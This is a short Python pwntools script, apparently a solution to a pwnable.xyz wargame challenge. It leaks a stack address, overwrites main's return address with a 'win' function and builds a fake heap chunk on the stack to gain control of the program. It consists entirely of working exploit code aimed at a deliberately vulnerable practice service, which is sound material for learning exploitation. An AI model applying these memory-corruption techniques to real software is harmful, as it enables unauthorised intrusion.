from pwn import *

r = remote("svc.pwnable.xyz", 30005)

sla = r.sendlineafter
sa = r.sendafter

win = 0x400A3E

sla(b"> ", b"2")  # stack leak
rsp = int(r.recvline()[2:-1], 16) - 0x10  # rsp of main()

sla(b"> ", b"1")
r.send(b"a" * 8 + p64(rsp + 0x68))  # rsp+0x68 -> return address of main
sla(b"> ", b"3")

sla(b"> ", b"1")  # ret overwrite
r.send(p64(win) + p64(rsp + 0x78))  # rsp+0x78 -> size field of fake chunk
sla(b"> ", b"3")

sla(b"> ", b"1")  # make fake chunk
r.send(
    p64(0x21) + p64(rsp + 0x80) + p64(0) + p64(0x20)
)  # rsp+0x80 -> address of fake chunk
sla(b"> ", b"3")

sla(b"> ", b"0")

r.interactive()
